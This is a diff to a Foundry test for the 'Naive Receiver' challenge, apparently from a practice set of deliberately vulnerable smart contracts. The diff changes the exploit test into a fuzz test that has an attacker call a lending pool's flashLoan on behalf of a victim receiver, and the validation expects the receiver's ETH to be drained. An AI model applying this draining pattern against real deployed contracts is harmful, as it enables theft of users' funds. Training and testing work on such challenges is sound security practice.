@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
@@ -47,10 +48,14 @@ contract NaiveReceiver is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testExploit(uint256 borrowAmount) public {
+        vm.assume(borrowAmount > 1 && borrowAmount < ETHER_IN_POOL);
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), ETHER_IN_RECEIVER);
+        naiveReceiverLenderPool.flashLoan(
+            address(flashLoanReceiver),
+            borrowAmount
+        );
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
@@ -58,7 +63,10 @@ contract NaiveReceiver is Test {
 
     function validation() internal {
         // All ETH has been drained from the receiver
-        assertEq(address(flashLoanReceiver).balance, 0);
+        assertEq(
+            address(flashLoanReceiver).balance,
+            0
+        );
         assertEq(
             address(naiveReceiverLenderPool).balance,
             ETHER_IN_POOL + ETHER_IN_RECEIVER
